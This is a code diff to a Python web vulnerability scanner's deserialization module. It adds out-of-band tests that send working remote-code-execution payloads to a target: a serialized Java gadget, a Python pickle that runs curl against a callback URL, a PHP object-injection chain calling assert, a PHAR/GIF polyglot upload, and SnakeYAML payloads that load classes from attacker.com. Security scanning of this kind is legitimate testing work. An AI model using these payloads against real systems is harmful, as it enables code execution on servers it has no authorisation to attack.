@@ -2,7 +2,6 @@ import re
 import base64
 import hashlib
 import asyncio
-from typing import Dict, List, Set, Optional, Tuple
 from urllib.parse import urlparse, urljoin
 from modules.base import BaseModule
 from core.utils import extract_params, random_string
@@ -68,8 +67,9 @@ class DeserialModule(BaseModule):
     
     async def scan(self, target: str):
         self.findings = []
-        self.vulnerable_endpoints: List[Dict] = []
-        self.detected_formats: Set[str] = set()
+        self.vulnerable_endpoints = []
+        self.detected_formats = set()
+        self.oob_manager = self.config.get("oob_manager")
         
         params = extract_params(target)
         callback_host = self.config.get("callback_host")
@@ -99,7 +99,107 @@ class DeserialModule(BaseModule):
         
         await asyncio.gather(*test_tasks, return_exceptions=True)
         
+        if self.oob_manager:
+            await self._test_blind_deserialization_oob(target, params)
+        
+        if self.aggressive:
+            await self._test_phar_deserialization(target)
+            await self._test_snakeyaml_rce(target)
+        
         return self.findings
+    
+    async def _test_blind_deserialization_oob(self, target, params):
+        token = self.oob_manager.generate_token()
+        callback_url = self.oob_manager.get_http_url(token)
+        dns_callback = self.oob_manager.get_dns_payload(token)
+        
+        oob_java_gadget = f"rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD/////////dAAA"
+        
+        oob_python_pickle = base64.b64encode(
+            f"cos\nsystem\n(S'curl {callback_url}'\ntR.".encode()
+        ).decode()
+        
+        oob_php = f'O:21:"JDatabaseDriverMysqli":3:{{s:4:"a]a]a]";O:17:"JSimplepieFactory":0:{{}}s:21:"disconnectHandlers";a:1:{{i:0;a:2:{{i:0;O:9:"SimplePie":5:{{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{{}}s:5:"cache";b:1;s:19:"cache_name_function";s:6:"assert";s:10:"javascript";i:9999;s:8:"feed_url";s:52:"curl {callback_url}";}}i:1;s:4:"init";}}}}s:13:"connection";i:1;}}'
+        
+        for param in (params or ["data", "payload", "object"]):
+            await self.test_param(target, param, oob_java_gadget)
+            await self.test_param(target, param, oob_python_pickle)
+            await self.test_param(target, param, oob_php)
+            await self.test_param(target, param, base64.b64encode(oob_php.encode()).decode())
+        
+        await self.http.post(target, data=oob_java_gadget, headers={"Content-Type": "application/octet-stream"})
+        await self.http.post(target, data=oob_python_pickle, headers={"Content-Type": "application/octet-stream"})
+        
+        await asyncio.sleep(3)
+        
+        interactions = self.oob_manager.check_interactions(token)
+        if interactions:
+            self.add_finding(
+                "CRITICAL",
+                "Blind Deserialization RCE CONFIRMED via OOB",
+                url=target,
+                evidence=f"Callback: {interactions[0]}",
+                confidence_evidence=["oob_callback_received", "deserial_rce_confirmed"],
+                request_data={"method": "POST", "url": target}
+            )
+            return True
+        return False
+    
+    async def _test_phar_deserialization(self, target):
+        phar_polyglot_header = b'GIF89a<?php __HALT_COMPILER(); ?>'
+        
+        phar_test_paths = [
+            "phar:///var/www/html/uploads/test.gif",
+            "phar://./uploads/test.gif",
+            "phar:///tmp/test.phar",
+        ]
+        
+        parsed = urlparse(target)
+        base_url = f"{parsed.scheme}://{parsed.netloc}"
+        
+        for path in ["/upload", "/api/upload", "/file"]:
+            upload_url = f"{base_url}{path}"
+            resp = await self.http.post(
+                upload_url,
+                data=phar_polyglot_header,
+                headers={"Content-Type": "image/gif"}
+            )
+            
+            if resp.get("status") in [200, 201]:
+                self.add_finding(
+                    "HIGH",
+                    "PHAR polyglot upload possible",
+                    url=upload_url,
+                    evidence="GIF with PHAR payload accepted - test file operations for deserialization",
+                    confidence_evidence=["phar_upload_accepted"]
+                )
+                return
+    
+    async def _test_snakeyaml_rce(self, target):
+        snakeyaml_payloads = [
+            '!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker.com/"]]]]',
+            '!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: "rmi://attacker.com/obj", autoCommit: true}',
+        ]
+        
+        for payload in snakeyaml_payloads:
+            resp = await self.http.post(
+                target,
+                data=payload,
+                headers={"Content-Type": "application/x-yaml"}
+            )
+            
+            if resp.get("status"):
+                text = resp.get("text", "").lower()
+                if "snakeyaml" in text or "constructor" in text or "scriptengine" in text:
+                    self.add_finding(
+                        "CRITICAL",
+                        "SnakeYAML Deserialization RCE",
+                        url=target,
+                        evidence="SnakeYAML unsafe deserialization detected",
+                        confidence_evidence=["snakeyaml_rce", "yaml_deserial"],
+                        request_data={"method": "POST", "url": target, "content_type": "application/x-yaml"}
+                    )
+                    return
     
     def _detect_serialization_format(self, target: str, resp: Dict):
         text = resp.get("text", "")
